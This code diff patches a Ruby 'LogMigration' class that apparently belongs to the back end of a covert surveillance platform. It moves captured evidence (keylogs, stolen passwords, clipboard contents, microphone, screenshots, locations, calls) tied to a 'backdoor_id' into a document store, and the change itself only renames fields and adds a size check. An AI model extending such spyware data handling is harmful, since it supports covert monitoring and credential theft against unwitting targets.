@@ -130,9 +130,11 @@ class LogMigration
     ev.data = migrate_data(log)
 
     # save the binary data
-    ev.data[:_grid_size] = log[:longblob1].bytesize
-    ev.data[:_grid] = GridFS.instance.put(log[:longblob1], {filename: backdoor_id.to_s}) if log[:longblob1].bytesize > 0
-
+    if log[:longblob1].bytesize > 0
+      ev.data[:_grid_size] = log[:longblob1].bytesize
+      ev.data[:_grid] = GridFS.instance.put(log[:longblob1], {filename: backdoor_id.to_s})
+    end
+    
     ev.save
   end
 
@@ -146,7 +148,7 @@ class LogMigration
       when 'ADDRESSBOOK'
         conversion = {:varchar1 => :name, :varchar2 => :contact, :longtext1 => :info}
       when 'APPLICATION'
-        conversion = {:varchar1 => :process, :varchar2 => :action, :longtext1 => :desc}
+        conversion = {:varchar1 => :program, :varchar2 => :action, :longtext1 => :desc}
       when 'CALENDAR'
         conversion = {:varchar1 => :event, :varchar2 => :type, :int1 => :begin, :int2 => :end, :longtext1 => :info}
       when 'CALL'
@@ -158,21 +160,21 @@ class LogMigration
       when 'CLIPBOARD'
         conversion = {:varchar1 => :program, :varchar2 => :window, :longtext1 => :content}
       when 'DEVICE'
-        conversion = {:longtext1 => :info}
+        conversion = {:longtext1 => :content}
       when 'DOWNLOAD', 'UPLOAD'
         conversion = {:varchar1 => :path}
       when 'FILECAP'
         conversion = {:varchar1 => :path, :varchar2 => :md5}
       when 'FILEOPEN'
         log[:size] = (log[:int1] << 32) + log[:int2]
-        conversion = {:varchar1 => :process, :varchar2 => :md5, :int3 => :access, :size => :size}
+        conversion = {:varchar1 => :program, :varchar2 => :md5, :int3 => :access, :size => :size}
       when 'FILESYSTEM'
         log[:size] = (log[:int1] << 32) + log[:int2]
         conversion = {:varchar1 => :path, :int3 => :attr, :size => :size}
       when 'INFO'
-        conversion = {:longtext1 => :info}
+        conversion = {:longtext1 => :content}
       when 'KEYLOG'
-        conversion = {:varchar1 => :process, :varchar2 => :window, :longtext1 => :content}
+        conversion = {:varchar1 => :program, :varchar2 => :window, :longtext1 => :content}
       when 'LOCATION'
         case log[:varchar2]
           when 'IPv4'
@@ -192,13 +194,13 @@ class LogMigration
       when 'MIC'
         conversion = {:int1 => :duration, :int3 => :status}
       when 'MOUSE'
-        conversion = {:varchar1 => :process, :varchar2 => :window, :int2 => :x, :int3 => :y, :int1 => :resolution}
+        conversion = {:varchar1 => :program, :varchar2 => :window, :int2 => :x, :int3 => :y, :int1 => :resolution}
       when 'PASSWORD'
         conversion = {:varchar1 => :program, :varchar2 => :service, :varchar3 => :pass, :varchar4 => :user}
       when 'PRINT'
         conversion = {:varchar1 => :spool, :longtext1 => :ocr}
       when 'SNAPSHOT'
-        conversion = {:varchar1 => :process, :varchar2 => :window, :longtext1 => :ocr}
+        conversion = {:varchar1 => :program, :varchar2 => :window, :longtext1 => :ocr}
       when 'URL'
         conversion = {:varchar1 => :url, :varchar2 => :browser, :varchar3 => :title, :varchar4 => :keywords, :longtext1 => :ocr}
     end
